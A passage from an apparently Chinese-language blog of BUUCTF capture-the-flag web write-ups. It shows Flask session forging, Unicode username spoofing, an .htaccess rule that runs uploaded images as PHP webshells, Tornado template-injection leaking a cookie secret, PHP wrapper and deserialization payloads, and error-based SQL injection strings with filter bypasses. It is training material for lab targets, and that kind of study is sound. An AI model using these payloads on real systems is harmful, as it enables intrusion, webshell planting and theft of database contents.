<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">&#123;&#x27;<span class="hljs-built_in">_</span>fresh&#x27;: True, &#x27;<span class="hljs-built_in">_</span>id&#x27;: b&#x27;bafbd1480fdd46b98923215f87b09819c462f63dde252eb4e80e7f334b7dd393b2c8008b774de295ac8b326b280d24f41ae449b9a29b049dfc5f724a7e73d4a5&#x27;, &#x27;csrf<span class="hljs-built_in">_</span>token&#x27;: b&#x27;63eb578ef8c784dffe46e0f242802654151acf83&#x27;, &#x27;image&#x27;: b&#x27;JKbO&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user<span class="hljs-built_in">_</span>id&#x27;: &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure>
<p>利用工具<code>flask-session-cookie-manager</code>伪造session：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745499109626.png" srcset="/img/loading.gif" lazyload alt="1745499109626"></p>
<h3 id="Unicode欺骗">Unicode欺骗</h3>
<h4 id="原理">原理</h4>
<p>我们发现在注册、登录、修改密码中均使用了<code>strlower()</code>函数：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745500382827.png" srcset="/img/loading.gif" lazyload alt="1745500382827"></p>
<p>strlower函数定义如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用nodeprep.prepare()</span><br><span class="hljs-comment">#nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距大，存在漏洞。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">strlower</span>(<span class="hljs-params">username</span>):<br>    username = nodeprep.prepare(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure>
<p>具体原理如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">字符ᴬ经过一次strlower()会转变为A，在经过一次strlower()会转变为a<br><span class="hljs-comment">%借助ᴬᴰᴹᴵᴺ和三个strlower()函数入口进行构造</span><br></code></pre></td></tr></table></figure>
<p>具体步骤如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tex">1. 首先注册一个用户名为ᴬᴰᴹᴵᴺ，密码为123456的账号<br>2. 使用上述账号进行登录，此时登录页面进行一次strlower,session[&#x27;name&#x27;]会记录为ADMIN<br>3. 接着进行修改密码，/change页面在读取用户session[&#x27;name&#x27;]后再进行一次strlower，找到admin账号，我们修改其密码即可。<br><br><span class="hljs-comment">%这里需要注意，后端数据库会将注册的用户名经过strlower()后作为主键，所以我们使用ᴬᴰᴹᴵᴺ注册时，验证的是ADMIN不会重复。</span><br><span class="hljs-comment">%小bug:网站注册的用户名在登录时可以不区分大小写。</span><br></code></pre></td></tr></table></figure>
<h2 id="MRCTF2020-你传你🐎呢">[MRCTF2020]你传你🐎呢</h2>
<ol>
<li>首先尝试上传一句话木马<code>1.php</code>，修改文件类型为<code>image/jpeg</code>，修改php后缀为<code>php3,php4,phtml</code>，以上尝试均失败，后台可能过滤了所有php类型的文件后缀，只允许上传<code>jpg</code>和<code>png</code>类型：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745551946125.png" srcset="/img/loading.gif" lazyload alt="1745551946125"></p>
<ol start="2">
<li>只能考虑上传图片马，但图片马无法按照php来解析执行，如何解决？</li>
</ol>
<p>这里需要借助apache的配置文件<code>.htaccess</code>，该文件的介绍如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">.htaccess文件（分布式配置文件），提供了针对目录改变配置的方法，就是在一个特定的文件目录中放置一个包含多个指令的.htaccess文件，以作用于此目录及其子目录。<br></code></pre></td></tr></table></figure>
<p>.htaccess内容如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%指定文件，按照php代码来执行</span><br>&lt;FilesMatch &quot;xx.png/xx.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br><br><span class="hljs-comment">%将.png或者.jpg文件当成php代码执行</span><br>AddType application/x-httpd-php .png<br>AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>具体实施：</li>
</ol>
<p>上传上述的<code>.htaccess</code>文件，这里需要将文件类型转为<code>image/jpeg</code>；</p>
<p>上传图片马；</p>
<p>蚁剑连接，在/目录下找到flag。</p>
<h2 id="护网杯-2018-easy-tornado">[护网杯 2018]easy_tornado</h2>
<ol>
<li>查看题目，给出三个页面，分别为<code>flag.txt</code>，<code>welcome.txt</code>，<code>hints.txt</code>，三个页面的分别如下：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%flag.txt:</span><br>/flag.txt<br>flag in /fllllllllllllag<br><br><span class="hljs-comment">%welcome.txt:</span><br>/welcome.txt<br>render<br><br><span class="hljs-comment">%hints.txt:</span><br>/hints.txt<br>md5(cookie<span class="hljs-built_in">_</span>secret+md5(filename))<br></code></pre></td></tr></table></figure>
<p>再结合每个页面的URL：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745762008976.png" srcset="/img/loading.gif" lazyload alt="1745762008976"></p>
<p>可知，需要构造以下的payload:</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">?filename=/fllllllllllllag<span class="hljs-built_in">&amp;</span>filehash=md5(cookie<span class="hljs-built_in">_</span>secret+md5(/fllllllllllllag))<br><span class="hljs-comment">%需要寻找cookie_secret(环境变量)</span><br></code></pre></td></tr></table></figure>
<ol start="2">
<li>根据第二个提示，存在ssti服务器模版注入，先尝试使用错误的filehash值，页面如下：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render.<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745762179494.png" srcset="/img/loading.gif" lazyload alt="1745762179494"></p>
<p>URL中的msg显示在页面中，可能就是render函数的入口，验证存在：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745762242983.png" srcset="/img/loading.gif" lazyload alt="1745762242983"></p>
<p>但如果使用<code>&#123;&#123;2*2&#125;&#125;</code>,页面会显示orz，可能存在过滤。</p>
<ol start="3">
<li>知道render函数入口，题目提示是tornado框架，如何利用ssti找到框架中的环境变量：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tex">Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快.<br><br>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量。<br> <br>简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息.<br></code></pre></td></tr></table></figure>
<p>所以可以通过以下payload来获取cookie_secret：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">http://da9e0652-7190-44b1-9ed7-ce0b14f1c956.node5.buuoj.cn:81/error?msg=&#123;&#123;handler.settings&#125;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745762814382.png" srcset="/img/loading.gif" lazyload alt="1745762814382"></p>
<ol start="4">
<li>利用以下md5加密脚本或者使用在线网站即可构造filehash:</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib  <span class="hljs-comment">#选用哈希模块</span><br>filename = <span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span>  <span class="hljs-comment">#文件名</span><br>cookie_secret = <span class="hljs-string">&#x27;76fc62a3-fea5-46ab-8f95-4b7262246f8c&#x27;</span><span class="hljs-comment">#cookie_secret值</span><br>filename = hashlib.md5(filename.encode()).hexdigest()<span class="hljs-comment">#/fllllllllllllag进行32位小写哈希md5加密</span><br>a = cookie_secret + filename<span class="hljs-comment">#md5值进行拼接</span><br>filehash = hashlib.md5(a.encode()).hexdigest()<span class="hljs-comment">#计算拼接后的md5值的md532小写的值</span><br><span class="hljs-built_in">print</span>(filehash)<span class="hljs-comment">#输出加密后的md532位小写的值</span><br></code></pre></td></tr></table></figure>
<h2 id="ZJCTF-2019-NiZhuanSiWei">[ZJCTF 2019]NiZhuanSiWei</h2>
<p>题目源码如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745810869975.png" srcset="/img/loading.gif" lazyload alt="1745810869975"></p>
<ol>
<li>首先需要符合第一个条件<code>file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;</code>，这里的要求是：<strong>从文件里读取字符串，还要和welcome to the zjctf相等</strong>。</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%利用data协议写入</span><br>?text=data://text/plain/,welcome to the zjctf<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>符合第一个条件后，会进入上述传入内容的渲染页面，要通过include读取出<code>useless.php</code>的内容，利用filter协议在读取前进行base64编码：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">?file=php://filter/read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>读取后进行解码，源码如下，然后进行反序列利用：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
<p>反序列化字符串构造代码如下，赋值file为flag.php即可：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;text.txt&quot;</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span> <br><br><span class="hljs-comment">#O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </span><br></code></pre></td></tr></table></figure>
<p>这里会自动调用__tostring的与代码有关：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745812529157.png" srcset="/img/loading.gif" lazyload alt="1745812529157"></p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">执行反序列化函数后，<span class="hljs-built_in">$</span>password 为我们实例化出的对象，这里使用echo进行输出，将对象作为字符串输出，会自动调用<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>tostring魔术方法<br></code></pre></td></tr></table></figure>
<p>最终的payload如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">http://4e72591f-e026-48e2-bb03-aa3b7b8f6987.node5.buuoj.cn:81/?text=data://text/plain/,welcome to the zjctf<span class="hljs-built_in">&amp;</span>file=useless.php<span class="hljs-built_in">&amp;</span>password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;<br><br><span class="hljs-comment">%这里include(file)时，不能再进行base64编码，因为要进行反序列化，要定义flag类，flag类在useless.php中定义</span><br></code></pre></td></tr></table></figure>
<h2 id="MRCTF2020-Ez-bypass">[MRCTF2020]Ez_bypass</h2>
<p>题目代码如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745832099488.png" srcset="/img/loading.gif" lazyload alt="1745832099488"></p>
<ol>
<li>绕过md5强类型比较，传入数组：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">?id[]=1<span class="hljs-built_in">&amp;</span>gg[]=2<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>绕过<code>is_numeric()</code>函数：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">passed=1234567<span class="hljs-comment">%00</span><br></code></pre></td></tr></table></figure>
<h2 id="极客大挑战-2019-HardSQL">[极客大挑战 2019]HardSQL</h2>
<ol>
<li>
<p>本题对输入内容进行了过滤，过滤了union（联合注入）,过滤了=（布尔注入），尝试报错注入；</p>
</li>
<li>
<p>这里写报错注入语句时，注意过滤了空格和=，进行绕过：</p>
</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">空格：连接时用（）代替<br>=：可以使用like替代<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>查看当前数据库：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">username=123&#x27;or(updatexml(1,concat(&#x27;~&#x27;,(database()),&#x27;~&#x27;),1))<span class="hljs-params">#</span><br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745984386747.png" srcset="/img/loading.gif" lazyload alt="1745984386747"></p>
<ol start="4">
<li>查看表：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">username=123&#x27;or(updatexml(1,concat(&#x27;~&#x27;,(),&#x27;~&#x27;),1))<span class="hljs-params">#</span><br></code></pre></td></tr></table></figure>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">():<br>select(group<span class="hljs-built_in">_</span>concat(table<span class="hljs-built_in">_</span>name))from(information<span class="hljs-built_in">_</span>schema.tables)where(table<span class="hljs-built_in">_</span>schema)like(&#x27;geek&#x27;)<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745984655517.png" srcset="/img/loading.gif" lazyload alt="1745984655517"></p>
<ol start="5">
<li>查看列名：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">():<br>select(group<span class="hljs-built_in">_</span>concat(column<span class="hljs-built_in">_</span>name))from(information<span class="hljs-built_in">_</span>schema.columns)where(table<span class="hljs-built_in">_</span>name)like(&#x27;H4rDsq1&#x27;)<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745984864831.png" srcset="/img/loading.gif" lazyload alt="1745984864831"></p>
<ol start="6">
<li>查数据：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">():<br>select(group<span class="hljs-built_in">_</span>concat(password))from(H4rDsq1)<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745985075384.png" srcset="/img/loading.gif" lazyload alt="1745985075384"></p>
<ol start="7">
<li>报错注入只回显32字符，分左右部分获取：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">username=123&#x27;or(updatexml(1,concat(&#x27;~&#x27;,right((select(group<span class="hljs-built_in">_</span>concat(password))from(H4rDsq1)),31),&#x27;~&#x27;),1))<span class="hljs-params">#</span><br></code></pre></td></tr></table></figure>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">():<br>(select(group<span class="hljs-built_in">_</span>concat(password))from(H4rDsq1)),31<br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745985468043.png" srcset="/img/loading.gif" lazyload alt="1745985468043"></p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz">[网鼎杯 2020 青龙组]AreUSerialz</h2>
<ol>
<li>题目代码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span 